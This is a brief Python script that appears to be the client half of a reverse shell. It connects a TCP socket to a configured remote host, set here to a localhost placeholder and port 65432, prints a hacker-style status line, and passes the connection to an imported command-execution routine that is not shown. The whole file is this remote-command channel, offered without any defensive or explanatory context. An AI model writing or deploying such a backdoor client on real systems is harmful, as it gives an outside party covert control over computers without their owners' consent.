import socket
from command_executor import execute_commands

# Connection settings
R_HOST = '127.0.0.1'
R_PORT = 65432

# Create a socket and connect to the server
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect((R_HOST, R_PORT))
print("[+] Connection established with server...")

# Executing commands
execute_commands(client_socket)
